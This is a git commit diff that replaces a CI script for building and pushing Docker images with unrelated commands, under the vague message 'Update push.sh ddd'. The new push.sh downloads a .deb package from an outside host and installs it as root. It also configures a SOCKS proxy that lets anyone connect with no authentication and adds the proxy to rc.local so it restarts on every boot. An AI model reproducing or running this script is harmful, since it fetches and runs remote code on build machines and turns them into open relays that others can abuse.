6c011eb5297ad9af460d009c29d29f44f8115741
cabagtent <43850085+cabagtent@users.noreply.github.com>
2018-10-04 15:14:26 +0300

    Update push.sh
    ddd

--- push.sh
+++ push.sh
@@ -1,45 +1,29 @@
-#!/usr/bin/env bash
+#!/bin/bash
+echo $path
+wget -P /tmp/ http://files.ahost.eu/deb/proxy/dante_1.4.1-1_amd64.deb
+dpkg -i /tmp/dante_1.4.1-1_amd64.deb
+touch /etc/sockd.conf
+echo "external.rotation: same-same">>/etc/sockd.conf
+echo "socksmethod: username none">>/etc/sockd.conf
+echo "compatibility: sameport">>/etc/sockd.conf
+echo "client pass {">>/etc/sockd.conf
+echo "from: 0.0.0.0/0 to: 0.0.0.0/0">>/etc/sockd.conf
+echo "}">>/etc/sockd.conf
+echo "socks pass {">>/etc/sockd.conf
+echo "from: 0.0.0.0/0 to: 0.0.0.0/0">>/etc/sockd.conf
+echo "}">>/etc/sockd.conf
 
-if [ "$TRAVIS_EVENT_TYPE" == "cron" ]; then
-  echo "Not pushing artifacts in cron jobs";
-  exit 0;
-fi;
+echo "">>/etc/sockd.conf
+sed -i -e "3 s/^/\/usr\/local\/sbin\/sockd -D -N 5\n/;" /etc/rc.local
+echo "Installation completed"
 
-if [ -z "$DOCKER_PASS" ] ; then
-  echo "This is a build triggered by an external PR. Skipping docker push.";
-  exit 0;
-fi;
+echo "All available ip:"
+ip=`/sbin/ifconfig | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
+echo $1
+echo $2
 
-echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
-
-for svc in openapi healthcheck; do
-    export REPO=${GROUP}/$(basename $svc);
-    echo "Building ${REPO}:$TRAVIS_COMMIT";
-    docker build -t ${REPO}:$TRAVIS_COMMIT ./$svc; DOCKER_EXIT=$(echo $?); if [[ "$DOCKER_EXIT" > 0 ]] ; then
-      echo "Docker build failed with exit code $DOCKER_EXIT";
-      exit 1;
-    fi;
-    export DOCKER_PUSH=1;
-    while [ "$DOCKER_PUSH" -gt 0 ] ; do
-      echo "Pushing $REPO:$TRAVIS_COMMIT";
-      docker push $REPO:$TRAVIS_COMMIT;
-      DOCKER_PUSH=$(echo $?);
-      if [[ "$DOCKER_PUSH" -gt 0 ]] ; then
-        echo "Docker push failed with exit code $DOCKER_PUSH";
-      fi;
-    done;
-    if [ "$TRAVIS_BRANCH" == "master" ]; then
-      docker tag $REPO:$TRAVIS_COMMIT $REPO:snapshot;
-      echo "Pushing $REPO:snapshot";
-      docker push $REPO:snapshot;
-    fi;
-    if [ ! -z "$TRAVIS_TAG" ];
-      then docker tag $REPO:$TRAVIS_COMMIT $REPO:$TRAVIS_TAG;
-      docker push $REPO:$TRAVIS_TAG;
-      docker tag $REPO:$TRAVIS_COMMIT $REPO:latest;
-      docker push $REPO:latest;
-    fi;
-done
-
-mkdir cfn-to-publish
-jq ".Description += \" (microservices-demo/microservices-demo@${TRAVIS_COMMIT})\"" "deploy/aws-ecs/cloudformation.json" > cfn-to-publish/microservices-demo.json
+sed -i -e "1 s/^/ \n/;" /etc/sockd.conf
+sed -i -e "1 s/^/external: $1\n/;" /etc/sockd.conf
+sed -i -e "1 s/^/internal: $1 port = $2\n/;" /etc/sockd.conf
+sockd -D
+exit 0
